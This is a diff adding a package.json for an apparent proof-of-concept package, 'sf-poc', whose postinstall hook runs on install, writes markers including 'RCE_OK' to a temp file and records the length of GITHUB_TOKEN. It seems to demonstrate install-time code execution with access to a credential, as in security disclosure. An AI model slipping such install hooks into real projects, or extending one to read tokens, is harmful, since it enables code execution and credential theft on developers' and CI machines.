@@ -1,0 +1,8 @@
+{
+  "name": "sf-poc",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "echo POC_MARKER_WRITTEN > /tmp/POC_SF.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_SF.txt; echo RCE_OK >> /tmp/POC_SF.txt; cat /tmp/POC_SF.txt"
+  }
+}
